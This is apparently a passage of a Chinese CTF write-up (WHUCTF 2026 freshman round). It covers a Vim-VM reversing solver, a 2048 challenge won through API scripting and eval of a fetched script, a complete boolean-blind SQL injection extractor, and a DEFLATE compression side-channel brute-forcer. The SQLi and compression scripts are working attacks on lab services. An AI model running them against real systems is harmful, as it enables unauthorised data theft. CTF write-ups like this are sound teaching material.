normal! 0"by$
normal! gg
execute "normal! " . str2nr(getreg("b")) . "j"
normal! 0"ay$
normal! 257G
execute "normal! " . str2nr(getreg("a")) . "j"
normal! 0"ay$
normal! gg
execute "normal! " . str2nr(getreg("b")) . "j"
normal! 0D
normal! 0"ap
normal! 65G
normal! 0D
normal! 0"bp
execute "normal! \<C-A>"
normal! 0"by$
```

40 组各处理一字节。

### 累计异或

Vim 之后还有累计 XOR，跟 `0x20c0` 的 40 字节比：

```text
c[0] = s[0]
c[i] = s[i] XOR c[i - 1]    (1 <= i < 40)
```

目标：

```text
aa150dca550f927708c700f9864530ffc700e3756f2fe8b923ec5d61ae69ff30bfbb741a029422df
```

反推置换结果：

```text
aabf18c79f5a9de57fcfc7f97fc375cf38c7e3961a40c7519acfb13ccfc796cf8f04cf6e1896b6fd
```

再查逆表得正文 `bR41nFu*k_1ik3?_v1M5Cr1p7_Vm_15_s0_E45y!`。丢回原程序输出 `Right!`。

### exp

```python
def gf_mul(a, b):
    result = 0
    for _ in range(8):
        if b & 1:
            result ^= a
        carry = a & 0x80
        a = (a << 1) & 0xff
        if carry:
            a ^= 0x1b
        b >>= 1
    return result

def gf_pow(a, power):
    result = 1
    while power:
        if power & 1:
            result = gf_mul(result, a)
        a = gf_mul(a, a)
        power >>= 1
    return result

def rotl8(value, count):
    return ((value << count) | (value >> (8 - count))) & 0xff

def aes_sbox(value):
    inverse = gf_pow(value, 254) if value else 0
    return (inverse ^ rotl8(inverse, 1) ^ rotl8(inverse, 2)
            ^ rotl8(inverse, 3) ^ rotl8(inverse, 4) ^ 0x63)

target = bytes.fromhex(
    'aa150dca550f927708c700f9864530ffc700e3756f2fe8b923ec5d61ae69ff30'
    'bfbb741a029422df'
)

sbox = [aes_sbox(value) for value in range(256)]
sbox[0x52], sbox[0xf4] = sbox[0xf4], sbox[0x52]
assert sbox[0x52] == 0xbf and sbox[0xf4] == 0x00
assert len(set(sbox)) == 256

inverse_sbox = [0] * 256
for value, substituted in enumerate(sbox):
    inverse_sbox[substituted] = value

substituted = bytes(
    [target[0]]
    + [target[i] ^ target[i - 1] for i in range(1, len(target))]
)
body = bytes(inverse_sbox[value] for value in substituted)

check = bytearray(sbox[value] for value in body)
for i in range(len(check) - 1):
    check[i + 1] ^= check[i]
assert bytes(check) == target
print(body.decode('ascii'))
```

### flag

whuctf{bR41nFu*k_1ik3?_v1M5Cr1p7_Vm_15_s0_E45y!}



<div style="page-break-before: always;"></div>


## checkin

### 先看看

经典 2048，玩到一万分给 flag。手玩又慢又难控分，直接看前端。

### 绕过 F12

页面按 F12 会弹 `不许作弊哦～`，`guard.js` 在拦。先开空白页按 F12，再在这个标签页打开题目地址，开发者工具就还在。`Ctrl+Shift+I` / 菜单打开开发者工具也行。

### 接口

`game.js` 里棋盘和分数都在后端：

| 接口 | 作用 |
| --- | --- |
| `GET /api/state` | `board` / `score` / `total` / `version` 等 |
| `POST /api/move` | `{"direction": 0~3, "version": v}`，左右上下 |
| `POST /api/restart` | 开新局 |

每次移动都要带最新 `version`。计分跟标准 2048 一样，合并加分，新刷的 2/4 不加。

### 坑：必须正好 10000

第一次脚本冲到 10024，奖励没解锁——要的是本局分数**恰好等于** 10000，不是 ≥。分数一直是 4 的倍数，10000 也是，能精确凑。

做法：分数 < 8200 时正常追高分（空格、单调性、平滑度、最大块搁左下角那套启发式）；≥8200 后丢掉单步 `gain > remaining` 的方向；走死就 `/api/restart`，最多 5 局。

### 拿奖励

到 10000 后 `fetch("/reward.js")` 再 `eval` + `checkPrize()`（直接加载脚本遇到过 `ERR_CONNECTION_RESET`）。第 1 局 10024 失败，第 2 局成功：

```json
{"board":[0,0,2,0,4,8,0,0,16,32,0,2,1024,128,16,4],"score":10000,"total":21328,"dead":false,"won":false,"version":1265}
```

### exp

Console 里先允许粘贴（Chrome 可能要先打 `allow pasting`），跑脚本 A；看到 `score: 10000` 再跑脚本 B。脚本走接口，页面棋盘不一定刷新，以 `/api/state` 为准。

脚本 A：自动玩到正好 10000

```javascript
(async () => {
  // 封装请求：有 body 时发 POST JSON，否则 GET；接口出错直接抛异常
  async function request(path, body) {
    const response = await fetch(path, body ? {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    } : undefined);
    const data = await response.json();
    if (!response.ok) throw new Error(`${path}: ${response.status} ${JSON.stringify(data)}`);
    return data;
  }

  // 本地模拟一次移动：direction 0左 1右 2上 3下
  // 返回移动后的棋盘、本步得分 gain、棋盘是否有变化
  function simulate(board, direction) {
    const next = Array(16).fill(0);
    let gain = 0;
    for (let line = 0; line < 4; line++) {
      // 左右按行取，上下按列取；向右/向下时倒序，统一成“往前压”
      let indexes = direction < 2
        ? [line * 4, line * 4 + 1, line * 4 + 2, line * 4 + 3]
        : [line, line + 4, line + 8, line + 12];
      if (direction === 1 || direction === 3) indexes.reverse();
      const values = indexes.map(i => board[i]).filter(Boolean); // 去掉空格
      const merged = [];
      for (let i = 0; i < values.length; i++) {
        if (i + 1 < values.length && values[i] === values[i + 1]) {
          const value = values[i] * 2;          // 相同方块合并
          merged.push(value);
          gain += value;                        // 得分 = 合并后的值
          i++;                                  // 每个方块每步只合并一次
        } else {
          merged.push(values[i]);
        }
      }
      indexes.forEach((index, i) => { next[index] = merged[i] || 0; });
    }
    return { board: next, gain, changed: next.some((value, i) => value !== board[i]) };
  }

  // 启发式评分：空格多、行列单调、相邻平滑、最大块在左下角(board[12]) 越好
  function evaluate(board, gain) {
    const log = value => value ? Math.log2(value) : 0;
    const empty = board.filter(value => !value).length;
    const maximum = Math.max(...board);
    let monotonicity = 0;
    let smoothness = 0;

    for (let row = 0; row < 4; row++) {          // 每一行
      let rising = 0, falling = 0;
      for (let col = 0; col < 3; col++) {
        const a = log(board[row * 4 + col]);
        const b = log(board[row * 4 + col + 1]);
        if (a > b) rising += b - a;
        else falling += a - b;
        if (board[row * 4 + col] && board[row * 4 + col + 1]) smoothness -= Math.abs(a - b);
      }
      monotonicity += Math.min(rising, falling);
    }

    for (let col = 0; col < 4; col++) {          // 每一列
      let rising = 0, falling = 0;
      for (let row = 0; row < 3; row++) {
        const a = log(board[row * 4 + col]);
        const b = log(board[(row + 1) * 4 + col]);
        if (a > b) rising += b - a;
        else falling += a - b;
        if (board[row * 4 + col] && board[(row + 1) * 4 + col]) smoothness -= Math.abs(a - b);
      }
      monotonicity += Math.min(rising, falling);
    }

    return empty * 280 + monotonicity * 47 + smoothness * 8
      + (board[12] === maximum ? log(maximum) * 150 : 0) + gain * 0.5;
  }

  let state = await request("/api/state");      // 读取后端当前局
  for (let attempt = 1; attempt <= 5; attempt++) {
    if (attempt > 1) {                           // 上一局失败就重开
      state = await request("/api/restart", { version: state.version });
    }
    let moves = 0;
    let stuck = false;

    while (state.score < 10000 && !state.dead && moves < 1200) {
      const remaining = 10000 - state.score;    // 距离 10000 还差多少
      const options = [];
      for (let direction = 0; direction < 4; direction++) {
        const candidate = simulate(state.board, direction);
        if (!candidate.changed) continue;        // 无效移动
        // 8200 分以后，不允许一步把分数推过 10000
        if (state.score >= 8200 && candidate.gain > remaining) continue;
        options.push({ direction, ...candidate, value: evaluate(candidate.board, candidate.gain) });
      }
      if (!options.length) {                     // 没有安全的方向，换下一局
        stuck = true;
        console.log("STUCK", attempt, moves, state.score, state.board);
        break;
      }
      options.sort((a, b) => b.value - a.value);
      const move = options[0];                   // 选评分最高的方向
      // 带上最新 version 提交给后端，用返回的新状态继续
      state = await request("/api/move", { direction: move.direction, version: state.version });
      moves++;
      if (moves % 80 === 0) console.log("PROGRESS", attempt, moves, state.score);
    }

    console.log("ATTEMPT", attempt, moves, state);
    if (state.score === 10000 && !state.dead) break;   // 正好 10000，成功
    if (!state.dead && !stuck && state.score < 10000 && moves >= 1200) break;
  }
})();
```

脚本 B：领奖励

```javascript
// 取回 reward.js 源码，在当前页面执行并调用 checkPrize()
fetch("/reward.js").then(r => r.text()).then(source => eval(source + ";checkPrize()"));
```

### flag

```
WHUCTF{fb6a35fa-9abb-fec4-6ebc-f39878afc1ec}
```



<div style="page-break-before: always;"></div>


## VOCALOID LEGEND ARCHIVE

### 先看看

gunicorn 站，GET `q` 搜索曲目。空白时「命中 374 条」。搜「是非」只一条。

![搜索是非](/blog-assets/writeups/WHUCTF2026新生赛WP/web/evidence/search-is-fei.png)

### 布尔盲注

`q=x` 摘要 4。单引号直接 400。试：

    x%' AND 1=1--
    x%' AND 1=2--

真 → 摘要 4，假 → 374。`q` 拼进 `LIKE '...'` 末尾带 `%`，`x%'` 提前结束模式，后面条件留在 SQL 里。

`LENGTH(database())>0` 为真；`sqlite_master` 400 → MySQL。UNION 出不了额外列，后面只读摘要数字。

### 枚举

当前库 2 张表：`myth_archive_4b20f884fd7f`、`songs`。隐藏表列 `id, note, archive_value_6c56d74856d5`，一行。要读的是后面那个字段。

长度折半得 46。每位 `ASCII(SUBSTRING(...))` 折半。前缀 `WHUCTF{`，整串：

    WHUCTF{Lu0Ti@nY1_lS_mY_f@VourItE-51NgER-1077c}

等值条件摘要 4，末尾多一个 `x` 变 374，确认收尾。

### exp

```python
#!/usr/bin/env python3
"""Boolean blind SQLi reader for the archive search parameter q."""
import re
import time
import requests

BASE = "http://127.0.0.1:63266/"
TRUE_COUNT, FALSE_COUNT = "4", "374"
SESSION = requests.Session()


def oracle(expression: str) -> bool:
    payload = "x%' AND (" + expression + ")-- "
    last_error = None
    for attempt in range(6):
        try:
            response = SESSION.get(BASE, params={"q": payload}, timeout=20)
        except requests.RequestException as exc:
            last_error = exc
            time.sleep(0.4 * (attempt + 1))
            continue
        match = re.search(r"命中 <strong>(\d+)</strong>", response.text)
        if response.status_code != 200 or not match:
            last_error = RuntimeError("HTTP " + str(response.status_code))
            time.sleep(0.3 * (attempt + 1))
            continue
        count = match.group(1)
        if count == TRUE_COUNT:
            return True
        if count == FALSE_COUNT:
            return False
        last_error = RuntimeError("count " + count)
        time.sleep(0.3)
    raise RuntimeError("oracle failed: " + str(last_error))


def scalar_length(sql: str, upper: int = 128) -> int:
    lo, hi = 0, upper
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle("LENGTH((" + sql + "))>" + str(mid)):
            lo = mid + 1
        else:
            hi = mid
    return lo


def extract_scalar(sql: str) -> str:
    size = scalar_length(sql)
    print("length=" + str(size), flush=True)
    value = ""
    for pos in range(1, size + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            expr = (
                "ASCII(SUBSTRING((" + sql + ")," + str(pos) + ",1))>" + str(mid)
            )
            if oracle(expr):
                lo = mid + 1
            else:
                hi = mid
        value += chr(lo)
        print(value, flush=True)
    return value


def count_until(sql: str, limit: int = 64) -> int:
    count = 0
    while oracle("(" + sql + ")>" + str(count)):
        count += 1
        if count > limit:
            raise RuntimeError("count exceeded")
    return count


def main() -> None:
    table_count_sql = (
        "SELECT COUNT(*) FROM information_schema.tables "
        "WHERE table_schema=database()"
    )
    table_count = count_until(table_count_sql)
    print("database_tables", table_count, flush=True)
    for index in range(table_count):
        table_sql = (
            "SELECT table_name FROM information_schema.tables "
            "WHERE table_schema=database() ORDER BY table_name LIMIT "
            + str(index) + ",1"
        )
        table = extract_scalar(table_sql)
        print("table", index, repr(table), flush=True)
        col_count_sql = (
            "SELECT COUNT(*) FROM information_schema.columns "
            "WHERE table_schema=database() AND table_name='" + table + "'"
        )
        col_count = count_until(col_count_sql)
        columns = []
        for col_index in range(col_count):
            column_sql = (
                "SELECT column_name FROM information_schema.columns "
                "WHERE table_schema=database() AND table_name='" + table + "' "
                "ORDER BY ordinal_position LIMIT " + str(col_index) + ",1"
            )
            column = extract_scalar(column_sql)
            columns.append(column)
            print(" column", col_index, repr(column), flush=True)
        if table == "songs":
            continue
        row_sql = "SELECT COUNT(*) FROM " + table
        print("rows", count_until(row_sql), flush=True)
        for column in columns:
            if column == "id":
                continue
            target = (
                "SELECT " + column + " FROM " + table + " ORDER BY id LIMIT 0,1"
            )
            value = extract_scalar(target)
            print("VALUE", column, repr(value), flush=True)
            escaped = value.replace("\\", "\\\\").replace("'", "\\'")
            exact = oracle(
                "(SELECT COUNT(*) FROM " + table + " WHERE " + column
                + "='" + escaped + "')=1"
            )
            extra = oracle(
                "(SELECT COUNT(*) FROM " + table + " WHERE " + column
                + "='" + escaped + "x')=0"
            )
            print("exact_stored_value_matches_one_row=" + str(exact), flush=True)
            print("appended_character_matches_zero_rows=" + str(extra), flush=True)


if __name__ == "__main__":
    main()
```

### flag

```text
WHUCTF{Lu0Ti@nY1_lS_mY_f@VourItE-51NgER-1077c}
```



<div style="page-break-before: always;"></div>


## 大猫嚼嚼嚼

### 先看看

D3LM 小厨房：提交字符串，返回 `compressed_length` 和嚼了多久。flag 藏在服务端拼接串里。

### 接口

`app.js`：

```js
const response = await fetch('/api/taste', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ text: input.value, taste_time: window.D3LM.delayMs }),
});
```

`POST /api/taste`，JSON `{"text","taste_time"}`。`taste_time` 是服务端 sleep，直接传 `0` 跳过等待。

### 压缩旁路

服务把「提交串 + flag」拼起来 DEFLATE，返回压缩长度。重合越多压得越短——标准 CRIME/BREACH 思路，逐字符爆破。

| 提交 | compressed_length |
| --- | ---: |
| （空） | 46 |
| 16 个 A | 48 |
| `flag{` | 49 |

### 手验一位

```js
const taste = async t => (await (await fetch('/api/taste',{
  method:'POST', headers:{'Content-Type':'application/json'},
  body:JSON.stringify({text:t, taste_time:0})})).text());

for (const c of "0123456789abcdef")
  console.log(c, await taste("flag{"+c));
```

只有 `3` 是 49，其余 50 → 第 6 位是 `3`。

![试出 3](/blog-assets/writeups/WHUCTF2026新生赛WP/web/step1_char3.png)

### exp

```js
const taste = async t => {
  const r = await (await fetch('/api/taste', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ text: t, taste_time: 0 })   // taste_time=0 跳过 7 秒延时
  })).text();
  return +r.match(/compressed_length=(\d+)/)[1];        // 取压缩长度
};

(async () => {
  const cs = "0123456789abcdef}";   // flag 内容是 32 位十六进制
  let known = "flag{";
  while (!known.endsWith("}") && known.length < 80) {
    let best = null, bestLen = 1e9;
    for (const c of cs) {               // 逐个候选字符
      const L = await taste(known + c);
      if (L < bestLen) { bestLen = L; best = c; }  // 压缩长度最小的就是正确字符
    }
    known += best;
    console.log(known);
  }
  console.log("FLAG =", known);
})();
```

从 `flag{` 起，候选 `0-9a-f}`，取压缩最短的往下拼，直到 `}`。

![完整 flag](/blog-assets/writeups/WHUCTF2026新生赛WP/web/step2_fullflag.png)

### flag

```txt
flag{37f30abefe4d7e0419e1f99d06f45151}
```



<div style="page-break-before: always;"></div>


## AI使用说明

解题主要靠 Codex（gpt-6-luna），加上自己搭的 CTF 技能和工作流，详见 https://github.com/Felixz6/whuctf-solver-workflow

Writeup 整理润色用了 Grok：思路和完整脚本保留，结构统一了一下。
